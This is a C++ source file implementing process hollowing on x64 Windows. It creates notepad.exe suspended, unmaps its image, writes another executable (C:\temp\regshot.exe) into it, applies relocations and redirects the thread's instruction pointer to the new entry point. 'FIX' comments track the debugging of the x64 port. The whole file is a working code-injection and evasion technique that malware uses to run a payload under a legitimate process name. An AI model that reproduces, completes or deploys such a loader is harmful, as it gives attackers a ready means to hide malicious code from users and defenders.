#include <iostream>
#include <Windows.h>
#include <malloc.h>

typedef LONG NTSTATUS;

typedef enum _PROCESSINFOCLASS {
    ProcessBasicInformation = 0
} PROCESSINFOCLASS;

typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;

// Function pointer typedef
typedef NTSTATUS (NTAPI* pNtQueryInformationProcess)(
    HANDLE,
    PROCESSINFOCLASS,
    PVOID,
    ULONG,
    PULONG
);

using NtUnmapViewOfSection = NTSTATUS(WINAPI*)(HANDLE, PVOID);

typedef struct BASE_RELOCATION_BLOCK {
    DWORD PageAddress;
    DWORD BlockSize;
} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type   : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

int main()
{
    // -------------------------------------------------------------------------
    // Create destination process (suspended) — process to be hollowed out.
    // -------------------------------------------------------------------------
    LPSTARTUPINFOA si = new STARTUPINFOA();
    LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
    PROCESS_BASIC_INFORMATION* pbi = new PROCESS_BASIC_INFORMATION();
    DWORD returnLength = 0;

    if (!CreateProcessA(
            NULL,
            (LPSTR)"c:\\windows\\system32\\notepad.exe",
            NULL, NULL, TRUE,
            CREATE_SUSPENDED,
            NULL, NULL, si, pi))
    {
        std::cerr << "[-] CreateProcessA failed: " << GetLastError() << std::endl;
        return 1;
    }

    HANDLE destProcess = pi->hProcess;

    // -------------------------------------------------------------------------
    // FIX: Declare and load NtQueryInformationProcess via GetProcAddress.
    //      Previously only the typedef existed — no actual function pointer
    //      variable was declared, causing "not declared in this scope" error.
    // -------------------------------------------------------------------------
    pNtQueryInformationProcess NtQueryInfo =
        (pNtQueryInformationProcess)GetProcAddress(
            GetModuleHandleA("ntdll.dll"),
            "NtQueryInformationProcess"
        );

    if (!NtQueryInfo)
    {
        std::cerr << "[-] GetProcAddress (NtQueryInformationProcess) failed: "
                  << GetLastError() << std::endl;
        TerminateProcess(destProcess, 1);
        return 1;
    }

    // -------------------------------------------------------------------------
    // Get destination imageBase offset from the PEB.
    // PEB offset to ImageBaseAddress is 0x10 (16 bytes) on x64.
    // -------------------------------------------------------------------------
    NtQueryInfo(destProcess, ProcessBasicInformation,
                pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);

    ULONG_PTR pebImageBaseOffset = (ULONG_PTR)pbi->PebBaseAddress + 0x10;

    // -------------------------------------------------------------------------
    // Read destination imageBaseAddress out of the PEB.
    // Read sizeof(PVOID) bytes (8 on x64) — not hard-coded 4.
    // -------------------------------------------------------------------------
    LPVOID destImageBase = nullptr;
    SIZE_T bytesRead = 0;

    if (!ReadProcessMemory(destProcess, (LPCVOID)pebImageBaseOffset,
                           &destImageBase, sizeof(PVOID), &bytesRead))
    {
        std::cerr << "[-] ReadProcessMemory (PEB) failed: " << GetLastError() << std::endl;
        TerminateProcess(destProcess, 1);
        return 1;
    }

    // -------------------------------------------------------------------------
    // Read source payload file.
    // FIX: NULL → 0 for integer (non-pointer) arguments to avoid warnings.
    //      OPEN_ALWAYS → OPEN_EXISTING since we require the file to exist.
    // -------------------------------------------------------------------------
    HANDLE sourceFile = CreateFileA(
        "C:\\temp\\regshot.exe",
        GENERIC_READ,
        0,          // dwShareMode  — was NULL (non-pointer arg)
        NULL,
        OPEN_EXISTING,
        0,          // dwFlagsAndAttributes — was NULL (non-pointer arg)
        NULL
    );

    if (sourceFile == INVALID_HANDLE_VALUE)
    {
        std::cerr << "[-] CreateFileA (source) failed: " << GetLastError() << std::endl;
        TerminateProcess(destProcess, 1);
        return 1;
    }

    DWORD sourceFileSize = GetFileSize(sourceFile, NULL);
    LPVOID sourceFileBytesBuffer = HeapAlloc(GetProcessHeap(),
                                             HEAP_ZERO_MEMORY, sourceFileSize);
    if (!sourceFileBytesBuffer)
    {
        std::cerr << "[-] HeapAlloc failed." << std::endl;
        CloseHandle(sourceFile);
        TerminateProcess(destProcess, 1);
        return 1;
    }

    DWORD fileBytesRead = 0;
    ReadFile(sourceFile, sourceFileBytesBuffer, sourceFileSize, &fileBytesRead, NULL);
    CloseHandle(sourceFile);

    // -------------------------------------------------------------------------
    // Parse source image headers.
    // All pointer arithmetic uses ULONG_PTR to stay 64-bit clean.
    // -------------------------------------------------------------------------
    PIMAGE_DOS_HEADER sourceImageDosHeaders =
        (PIMAGE_DOS_HEADER)sourceFileBytesBuffer;
    PIMAGE_NT_HEADERS sourceImageNTHeaders =
        (PIMAGE_NT_HEADERS)((ULONG_PTR)sourceFileBytesBuffer
                            + sourceImageDosHeaders->e_lfanew);
    SIZE_T sourceImageSize = sourceImageNTHeaders->OptionalHeader.SizeOfImage;

    // -------------------------------------------------------------------------
    // Unmap the destination image.
    // -------------------------------------------------------------------------
    NtUnmapViewOfSection myNtUnmapViewOfSection =
        (NtUnmapViewOfSection)GetProcAddress(
            GetModuleHandleA("ntdll"), "NtUnmapViewOfSection");

    if (!myNtUnmapViewOfSection)
    {
        std::cerr << "[-] GetProcAddress (NtUnmapViewOfSection) failed: "
                  << GetLastError() << std::endl;
        TerminateProcess(destProcess, 1);
        return 1;
    }

    myNtUnmapViewOfSection(destProcess, destImageBase);

    // -------------------------------------------------------------------------
    // Allocate memory in the destination process for the source image.
    // Falls back to OS-chosen address if preferred base is unavailable.
    // -------------------------------------------------------------------------
    LPVOID newDestImageBase = VirtualAllocEx(destProcess, destImageBase,
                                             sourceImageSize,
                                             MEM_COMMIT | MEM_RESERVE,
                                             PAGE_EXECUTE_READWRITE);
    if (!newDestImageBase)
    {
        newDestImageBase = VirtualAllocEx(destProcess, NULL,
                                          sourceImageSize,
                                          MEM_COMMIT | MEM_RESERVE,
                                          PAGE_EXECUTE_READWRITE);
    }
    if (!newDestImageBase)
    {
        std::cerr << "[-] VirtualAllocEx failed: " << GetLastError() << std::endl;
        TerminateProcess(destProcess, 1);
        return 1;
    }
    destImageBase = newDestImageBase;

    // -------------------------------------------------------------------------
    // Compute relocation delta (pointer-sized on x64).
    // -------------------------------------------------------------------------
    ULONG_PTR deltaImageBase =
        (ULONG_PTR)destImageBase
        - (ULONG_PTR)sourceImageNTHeaders->OptionalHeader.ImageBase;

    sourceImageNTHeaders->OptionalHeader.ImageBase = (ULONG_PTR)destImageBase;

    // Write PE headers to the destination process.
    WriteProcessMemory(destProcess, newDestImageBase,
                       sourceFileBytesBuffer,
                       sourceImageNTHeaders->OptionalHeader.SizeOfHeaders, NULL);

    // -------------------------------------------------------------------------
    // Get pointer to first section header.
    // sizeof(IMAGE_NT_HEADERS) accounts for the native-width optional header.
    // -------------------------------------------------------------------------
    PIMAGE_SECTION_HEADER sourceImageSection =
        (PIMAGE_SECTION_HEADER)((ULONG_PTR)sourceFileBytesBuffer
                                + sourceImageDosHeaders->e_lfanew
                                + sizeof(IMAGE_NT_HEADERS));
    PIMAGE_SECTION_HEADER sourceImageSectionOld = sourceImageSection;

    // -------------------------------------------------------------------------
    // Copy all sections into the destination process.
    // -------------------------------------------------------------------------
    for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++)
    {
        PVOID destinationSectionLocation =
            (PVOID)((ULONG_PTR)destImageBase
                    + sourceImageSection->VirtualAddress);
        PVOID sourceSectionLocation =
            (PVOID)((ULONG_PTR)sourceFileBytesBuffer
                    + sourceImageSection->PointerToRawData);
        WriteProcessMemory(destProcess, destinationSectionLocation,
                           sourceSectionLocation,
                           sourceImageSection->SizeOfRawData, NULL);
        sourceImageSection++;
    }

    // Get relocation table descriptor.
    IMAGE_DATA_DIRECTORY relocationTable =
        sourceImageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    // -------------------------------------------------------------------------
    // Apply base relocations.
    // Patch reads/writes sizeof(ULONG_PTR) bytes — 8 bytes on x64.
    // -------------------------------------------------------------------------
    sourceImageSection = sourceImageSectionOld;
    for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++)
    {
        BYTE* relocSectionName = (BYTE*)".reloc";
        if (memcmp(sourceImageSection->Name, relocSectionName, 5) != 0)
        {
            sourceImageSection++;
            continue;
        }

        DWORD sourceRelocationTableRaw = sourceImageSection->PointerToRawData;
        DWORD relocationOffset = 0;

        while (relocationOffset < relocationTable.Size)
        {
            PBASE_RELOCATION_BLOCK relocationBlock =
                (PBASE_RELOCATION_BLOCK)((ULONG_PTR)sourceFileBytesBuffer
                                         + sourceRelocationTableRaw
                                         + relocationOffset);
            relocationOffset += sizeof(BASE_RELOCATION_BLOCK);

            DWORD relocationEntryCount =
                (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK))
                / sizeof(BASE_RELOCATION_ENTRY);

            PBASE_RELOCATION_ENTRY relocationEntries =
                (PBASE_RELOCATION_ENTRY)((ULONG_PTR)sourceFileBytesBuffer
                                          + sourceRelocationTableRaw
                                          + relocationOffset);

            for (DWORD y = 0; y < relocationEntryCount; y++)
            {
                relocationOffset += sizeof(BASE_RELOCATION_ENTRY);

                if (relocationEntries[y].Type == 0)
                    continue;

                DWORD patchAddress =
                    relocationBlock->PageAddress + relocationEntries[y].Offset;

                ULONG_PTR patchedBuffer = 0;
                ReadProcessMemory(destProcess,
                    (LPCVOID)((ULONG_PTR)destImageBase + patchAddress),
                    &patchedBuffer, sizeof(ULONG_PTR), &bytesRead);

                patchedBuffer += deltaImageBase;

                WriteProcessMemory(destProcess,
                    (PVOID)((ULONG_PTR)destImageBase + patchAddress),
                    &patchedBuffer, sizeof(ULONG_PTR), NULL);
            }
        }
    }

    // -------------------------------------------------------------------------
    // Redirect thread to new entry point.
    // CONTEXT must be 16-byte aligned on x64 → _aligned_malloc.
    // Use Rip (x64 instruction pointer), NOT Eax.
    // -------------------------------------------------------------------------
    LPCONTEXT context = (LPCONTEXT)_aligned_malloc(sizeof(CONTEXT), 16);
    if (!context)
    {
        std::cerr << "[-] _aligned_malloc for CONTEXT failed." << std::endl;
        TerminateProcess(destProcess, 1);
        return 1;
    }
    ZeroMemory(context, sizeof(CONTEXT));
    context->ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;

    if (!GetThreadContext(pi->hThread, context))
    {
        std::cerr << "[-] GetThreadContext failed: " << GetLastError() << std::endl;
        TerminateProcess(destProcess, 1);
        _aligned_free(context);
        return 1;
    }

    ULONG_PTR patchedEntryPoint =
        (ULONG_PTR)destImageBase
        + sourceImageNTHeaders->OptionalHeader.AddressOfEntryPoint;

    context->Rip = patchedEntryPoint;   // x64 instruction pointer

    SetThreadContext(pi->hThread, context);
    ResumeThread(pi->hThread);

    _aligned_free(context);

    // Cleanup
    HeapFree(GetProcessHeap(), 0, sourceFileBytesBuffer);
    delete si;
    delete pi;
    delete pbi;

    return 0;
}
